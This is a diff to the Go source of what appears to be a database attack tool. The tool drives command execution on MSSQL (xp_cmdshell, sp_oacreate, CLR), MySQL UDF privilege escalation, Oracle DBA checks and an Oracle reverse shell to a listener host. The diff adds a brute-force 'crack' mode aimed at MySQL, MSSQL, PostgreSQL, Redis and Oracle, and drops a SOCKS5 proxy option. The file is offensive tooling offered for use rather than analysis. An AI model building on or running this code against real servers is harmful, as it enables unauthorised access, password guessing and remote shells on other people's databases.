@@ -10,6 +10,7 @@ import (
 var (
 	// 连接状态
 	conn *sql.DB
+	sign bool
 
 	// redis
 	Ruser string
@@ -79,9 +80,9 @@ var (
 	Funcall                  bool
 	reverse                  bool
 
-	// Socks5代理
-	Socks5Proxy string
-	proxyAddr   = flag.String("socks5", "", "socks5代理")
+	// Crack
+	Crack bool
+	m     string
 )
 
 func init() {
@@ -151,6 +152,10 @@ func init() {
 	flag.BoolVar(&dbms_xmlquery_newcontext, "dx", false, "使用dbms_xmlquery_newcontext执行命令(dbms_export_extension存在漏洞前提下)")
 	flag.BoolVar(&Funcall, "fc", false, "使用dbms_java_test.funcall()反弹shell")
 
+	// Crack
+	flag.BoolVar(&Crack, "crack", false, "爆破参数")
+	flag.StringVar(&m, "m", "", "爆破的数据库类型")
+
 }
 
 func Help() {
@@ -160,7 +165,6 @@ func Help() {
 		if err != nil {
 			if strings.Contains(err.Error(), "context deadline exceeded") {
 				Info("Redis 连接超时")
-
 			}
 			if strings.Contains(err.Error(), "NOAUTH Authentication required.") {
 				Info("Redis 需要密码认证")
@@ -207,11 +211,9 @@ func Help() {
 			}
 		}
 	} else if MSsql {
-		err, conn := MssqlConnect(Rhost, Rport, PWD)
-		if err != nil {
-			Info("连接错误")
-			Err(err)
-		}
+		_, conn, _ := MssqlConnect(Rhost, Rport, Ruser, PWD)
+		MssqlCMD("select @@version;", conn)
+		Success("连接成功!")
 		switch {
 		case cli:
 			loopMssqlCMD(conn)
@@ -224,7 +226,6 @@ func Help() {
 			} else {
 				MssqlXpcmdshell(conn)
 			}
-
 			// sp_oacreate
 		case isSP:
 			if console {
@@ -237,7 +238,6 @@ func Help() {
 				OpenSpoacreate(conn)
 				//Getresult(table, conn)
 			}
-
 		// CLR
 		case isCLR:
 			if console {
@@ -261,7 +261,9 @@ func Help() {
 	} else if SSH {
 		SSHConnect(Ruser, Rhost, PWD)
 	} else if Mysql {
-		err, conn := MysqlConnect(Ruser, Rhost, PWD, Rport)
+		err, conn, _ := MysqlConnect(Ruser, Rhost, PWD, Rport)
+		m, err := MysqlCMD("select @@version;", conn)
+		fmt.Printf("数据库版本：Mysql %v\n", m[0]["@@version"])
 		if err != nil {
 			Info("连接错误")
 			Err(err)
@@ -279,7 +281,7 @@ func Help() {
 			UdfPrivilege(conn)
 		}
 	} else if Postgre {
-		conn := postgre_connect(Rhost, Rport, Ruser, PWD)
+		conn, _ := postgre_connect(Rhost, Rport, Ruser, PWD)
 		result, err := postgrecmd("select version();", conn)
 		if err != nil {
 			Err(err)
@@ -317,9 +319,26 @@ func Help() {
 			WriteFile(conn, uploadPath, e)
 		}
 	} else if Oracle {
-		conn, err := OracleConnect(Ruser, PWD, Rhost, Rport, sid)
+		conn, err, _ := OracleConnect(Ruser, PWD, Rhost, Rport, sid)
 		if err != nil {
 			Err(err)
+		}
+		resultSet, err := OracleCMD(fmt.Sprintf("select version from v$instance"), conn)
+		for _, m := range resultSet {
+			for _, value := range m {
+				Info(fmt.Sprintf("当前数据库版本为：%s", value))
+			}
+		}
+		isdba, err := OracleCMD("select userenv('ISDBA') from dual", conn)
+		for _, m := range isdba {
+			for _, value := range m {
+				fmt.Println(fmt.Sprintf("%s", value))
+				if strings.ToLower(fmt.Sprintf("%s", value)) == "true" {
+					Success("当前账号为DBA权限")
+				} else {
+					Info("当前账号非DBA权限")
+				}
+			}
 		}
 		switch {
 		case cli:
@@ -342,6 +361,18 @@ func Help() {
 			}
 		case Funcall:
 			OracleFuncCallReverse(conn, Lhost, Lport)
+		}
+	} else if Crack {
+		if m == "mysql" {
+			MysqlCrack(Rhost, Rport)
+		} else if m == "mssql" {
+			MssqlCrack(Rhost, Rport)
+		} else if m == "postgresql" {
+			PostgreCrack(Rhost, Rport)
+		} else if m == "redis" {
+			ReddisCrack()
+		} else if m == "oracle" {
+			OracleCrack(Rhost, Rport)
 		}
 	}
 }
